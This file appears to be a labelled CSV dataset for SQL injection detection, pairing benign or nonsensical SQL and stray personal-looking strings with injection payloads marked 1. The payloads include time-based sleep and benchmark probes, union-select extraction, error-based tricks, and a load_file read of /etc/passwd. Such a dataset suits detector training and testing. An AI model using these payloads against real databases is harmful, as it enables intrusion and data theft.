Query,Label
SELECT TOP 3 * FROM between WHERE flame = 'what' SELECT * FROM newspaper,0
-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--,1
"1'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
SELECT TOP 3 * FROM thought WHERE farm = 'addition',0
"1""   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""xnsj"" like ""xnsj",1
select   (  case when   (  2161  =  4328  )   then 2161 else 2161*  (  select 2161 from mysql.db  )   end  )  #,1
"-2072""  )   as rjcz where 2491  =  2491 or 6872  =  6872--",1
"-9370'  )   where 7070  =  7070 or make_set  (  9354  =  9354,7185  )  --",1
-4032'  )   where 5157  =  5157 or 1809  =  2810#,1
SELECT danger ( s )  FROM dot FULL OUTER JOIN,0
" union select * from users where login   =   char  (  114,111,111,116  )  ;",1
henry,0
 or 'unusual'   =   'unusual',1
luciano nagel,0
4.08791E+15,0
"1  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  4003  =  4003",1
1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'oofd'  =  'oofd,1
1%' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and '%'  =  ',1
gargajienta,0
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'stea'  =  'stea,1
SELECT sudden FROM cause UNION SELECT hospital FROM straw ORDER BY pleasure,0
" select * from users where id  =  '1' or \<\. union select 1,@@VERSION -- 1'",1
SELECT * FROM post ORDER BY swimming DESC,0
SELECT * FROM pupil,0
SELECT * FROM outline ORDER BY given DESC,0
SELECT * FROM flat WHERE drop BETWEEN pale09/01/1996weigh AND began15/31/1996known,0
SELECT * FROM suit 3 SELECT * FROM blue,0
SELECT * FROM area FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM during,0
SELECT town ( s )  FROM whom UNION,0
almazn cayul,0
SELECT * FROM ourselves WHERE sad = 'select' LIMIT 3,0
"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""eran""  =  ""eran",1
SELECT * FROM planned FETCH FIRST 3 ROWS ONLY,0
-8292%'  )   or 8571  =  8571--,1
1' rlike sleep  (  5  )   and 'gtfo'  =  'gtfo,1
"-6924'  )   union all select 2046,2046,2046,2046,2046,2046,2046--",1
1  )   where 1527  =  1527 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
SELECT one FROM writer UNION ALL SELECT pony FROM central ORDER BY plate,0
SELECT * FROM rather WHERE tail = 'related',0
SELECT AVG ( spend ) FROM turn SELECT SUM ( widely ) ,0
"-3775'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"1'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  'aiuy'  =  'aiuy",1
"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1
select case when 1613  =  2937 then 1 else null end--,1
SELECT * FROM careful ORDER BY brass DESC,0
SELECT society ( s )  FROM flight UNION ALL,0
angullo acosta,0
bancroft@lawn.mc,0
SELECT AVG ( slide )  FROM deeply  SELECT SUM ( central ) ,0
martens@ajuntamentbarcelona2-0.tl,0
SELECT * FROM question ORDER BY essential DESC,0
" select * from users where id  =  1 or 1#"", union select version  (    )  ,version  (    )   -- 1",1
salma,0
-8639  )   or 8138  =  6252,1
1 where 4785  =  4785 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1
SELECT ProductName FROM Products,0
"1' where 4039  =  4039 union all select null,null,null,null,null,null,null,null--",1
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",1
select case when 4537  =  8418 then 1 else null end--,1
SELECT jump ( s )  FROM cream SELECT audience ( s ) ,0
" SELECT column_name ( s )  FROM sport,accurate",0
"-3035""  )   union all select 7912,7912,7912#",1
-6377' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'qcms' like 'qcms,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 3792 )  ORDER BY meta_id ASC",0
SELECT DISTINCT belt FROM class,0
"-6073""   )    )     )   or 9502  =  2012#",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 53815 )  ORDER BY meta_id ASC",0
"   SELECT opposite, situation, foot FROM soft WHERE buffalo  IS NULL",0
"1%'  )   and make_set  (  8403  =  8403,8899  )   and   (  '%'  =  '",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1
"   SELECT temperature, which, leaving FROM correctly WHERE mysterious  IS NULL",0
80igm94016,0
"  SELECT underlineID AS ID, actual AS start FROM sat",0
"1' in boolean mode  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  #",1
SELECT support ( s )  FROM new FULL OUTER JOIN,0
"1'||  (  select 'lije' from dual where 5309  =  5309 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",1
SELECT TOP 3 * FROM engineer WHERE attached = 'circus' SELECT * FROM contain,0
"c/ espigo, 0 10h",0
"1 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  # zwck",1
aborr-ascarse,0
"-9698'   )    )    as qnjv where 3360  =  3360 or make_set  (  9354  =  9354,7185  )  --",1
"-6595"" order by 1--",1
SELECT AVG ( zulu ) FROM wealth,0
SELECT * FROM not WHERE warn NOT LIKE '[tin]%',0
SELECT * FROM television FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT potatoes ( s )  FROM exact FULL OUTER JOIN,0
select   (  case when   (  9490  =  6134  )   then 9490 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
"-5972"" or 8509  =  3448#",1
93310194e,0
"1""   )    )    as jsdc where 2748  =  2748",1
SELECT COUNT ( fierceID ) FROM safety,0
-4082   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   7874  =  7874,1
"1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'zpzf'  =  'zpzf",1
"1   )    )    as aqpy where 4027  =  4027 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
1  )   as bhdj where 4472  =  4472,1
standiford@elpaisaje.bg,0
"SELECT * FROM labor WHERE noted BETWEEN ""fresh"" AND    ""count""",0
kingslan,0
"campello, el",0
SELECT TOP 3 * FROM badly,0
select   (  case when   (  3859  =  6938  )   then 3859 else 3859*  (  select 3859 from mysql.db  )   end  )  #,1
4830,0
"1'  )   as khaa where 8157  =  8157 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
philipp.castella@biopoint.vc,0
obolensky@etnics.hr,0
"1'  )   as rvch where 1863  =  1863 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
idt,0
16417,0
SELECT * FROM only FETCH FIRST 50 PERCENT ROWS ONLY,0
"doctor ramon sanchez-parra, 17 11?d",0
1' rlike sleep  (  5  )   and 'ojqz' like 'ojqz,1
glatzeder.karr@lamejorplaya.so,0
1' in boolean mode  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
nicholls@devuelos.vu,0
-6984 order by 1#,1
"1%""  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  """,1
"c/ valtravieso s/n,",0
"-3209'+  (  select ldum where 9912  =  9912 union all select 9912,9912,9912,9912#",1
SELECT option_value FROM wp_options WHERE option_name  =  'sm_on_fly' LIMIT 1,0
SELECT label ( s )  FROM grown FULL OUTER JOIN,0
"-6996%"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"1  )   as clye where 7842  =  7842 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
follosas,0
89285662f,0
"   SELECT COUNT ( acres ) , corner FROM orbit BY drive",0
"  SELECT tried,accurate,stared FROM fellow LEFT JOIN Orders ON lose.happenID =  broke.list ORDER BY tribe.husband",0
"-4927'   )    )    union all select 1924,1924#",1
SELECT * FROM did WHERE body = 'pound'  AND  ( pour = 'original' OR tank = 'course' ) ,0
1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
select pg_sleep  (  5  )   and   (  '%'  =  ',1
"-4972'   )    )    as kfzc where 8817  =  8817 union all select 8817,8817,8817,8817,8817,8817--",1
choon,0
SELECT SYSTEM_USER (  ) ;,0
SELECT * FROM paint WHERE century BETWEEN 'change' AND 'selection',0
"1%'   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"-4605""  )   union all select 8542,8542,8542,8542,8542,8542,8542,8542--",1
tejeda y segoyuela,0
"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",1
lucas fiallega,0
44588,0
"  SELECT birdsID AS ID, suit AS still FROM rubbed",0
"1   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   4048  =  4048",1
"-8636""   )    )     )   union all select 1821,1821,1821,1821,1821,1821,1821,1821,1821,1821--",1
"-6334'  )   union all select 3738,3738,3738,3738,3738,3738,3738,3738--",1
"1' in boolean mode  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",1
"  SELECT eventuallyID AS ID, huge AS stuck FROM lay",0
8.90606E+14,0
SELECT * FROM glass  WHERE sometime NOT LIKE '[temperature]%',0
SELECT slightly ( s )  FROM steel LEFT JOIN,0
18670,0
"1'   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  'subq' like 'subq",1
"1%""   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
" SELECT * FROM his ORDER BY press ASC, ear DESC",0
SELECT * FROM football,0
"poblado de regulares 180, 1d",0
"1""   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""rvuz"" like ""rvuz",1
"1%""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""%""  =  """,1
37576555y,0
6$ng4tado,0
"1  )   where 7881  =  7881 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT TOP 50 PERCENT * FROM position,0
nedra,0
SELECT TOP 3 * FROM load WHERE several = 'film',0
SELECT Count ( * )  AS women,0
SELECT * FROM more WHERE NOT height = 'bite'  AND NOT expression = 'aside',0
"1'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   'rpof' like 'rpof",1
SELECT TOP 3 * FROM program,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""lzyl"" like ""lzyl",1
"1'  )   as ljpy where 8270  =  8270 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
1%' waitfor delay '0:0:5'--,1
"  SELECT SUBSTR ( ""SQL Tutorial"", 5, 3 )  AS ExtractString;",0
SELECT reader,0
44368,0
"   SELECT COUNT ( making ) , swimming FROM breakfast BY storm",0
"  SELECT ISNULL ( """" ) ;",0
SELECT DISTINCT wore FROM today,0
"1' where 8803  =  8803 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1  )   as nioj where 9703  =  9703,1
"-7433""   )    )    as zsnt where 2513  =  2513 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1
1'+  (  select 'ezpy' where 5282  =  5282 order by 1#,1
"1%'   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   '%'  =  '",1
SELECT * FROM pan,0
"coslada 83, 4g",0
"-9356 or elt  (  1032  =  1032,3623  )  -- izgi",1
SELECT atmosphere ( s )  FROM trap UNION,0
"INSERT INTO came ( animal, greatly, hurt, species, winter, corner )  VALUES  ( 'little', 'not'. went', 'poet', 'over', 'accurate', 'safety' )  ",0
SELECT * FROM Customers ORDER BY CustomerName DESC;,0
DELETE FROM bush WHERE deal = 'inside',0
"waitfor delay '0:0:5' and   (  ""dmcu""  =  ""dmcu",1
"   SELECT COUNT ( follow ) , grain FROM us BY pain",0
"-7202%""   )    )    union all select 2901#",1
SELECT * FROM biggest WHERE aboard = 'lamp'  AND  ( practice = 'canal' OR back = 'desert' ) ,0
SELECT * FROM biggest WHERE NOT gift = 'audience'  AND NOT my = 'angry',0
6.9084E+15,0
SELECT melted FROM strange,0
SELECT MIN ( wooden )  AS sight FROM valuable,0
"1'  )   where 4786  =  4786 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
" select * from users where id  =  1 or ""  (  ;"" or 1  =  1 -- 1",1
select case when 6420  =  7941 then 1 else null end--,1
"1""   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  ""hxgu""  =  ""hxgu",1
SELECT * FROM swept FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM pond,0
"   SELECT Employees.safe, COUNT ( Orders.keptID )  AS quietFROM    ( OrdersINNER JOIN model ON Orders.landID  =  Employees.babyID ) ",0
SELECT wealth FROM poem UNION SELECT taken FROM various ORDER BY blew,0
"INSERT INTO steady  ( kitchen, far, source )  VALUES  ( 'bear', 'ride', 'provide' )  ",0
"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'bmsa'  =  'bmsa",1
SELECT highway ( s )  FROM which FULL OUTER JOIN,0
pleiteador,0
33279,0
SELECT AVG ( shelf ) FROM sister,0
"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'ffzv'  =  'ffzv",1
6ong6,0
"1'||  (  select 'scwx' where 6591  =  6591 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  ||'",1
1'+  (  select 'ymgm' where 8204  =  8204 and sleep  (  5  )  #,1
47609,0
"SELECT CustomerName, ContactName, City FROM Customers WHERE Country  =  ""Brazil""; DROP VIEW [Brazil Customers];",0
SELECT * FROM old FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT COUNT ( accurate )  FROM nice,0
07441681p,0
SELECT tide FROM aboard,0
SELECT * FROM negative ORDER BY lost,0
"1'  )   where 3375  =  3375 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"1'+  (  select jidy where 2989  =  2989 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
SELECT FLOOR ( RAND (  ) * ( 10-5+1 ) +5 ) ;,0
"org/?option  =  com_k2  <a href  =  ""http://corfopym",0
boggs@cocteleria.dz,0
cruz,0
"1'+  (  select 'vabj' where 7178  =  7178 union all select null,null,null,null,null#",1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'ootz' like 'ootz",1
polop,0
"1   )    )    as juoe where 9994  =  9994 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
SELECT * FROM moon 3,0
"-9583'   )    )    union all select 6392,6392,6392,6392,6392,6392,6392,6392,6392,6392#",1
"1""   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and ""lxfm""  =  ""lxfm",1
vilamartn de valdeorras,0
sikes-jeans@923.mv,0
SELECT AVG ( however ) FROM nothing,0
quintina,0
SELECT * FROM elephant FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM slow,0
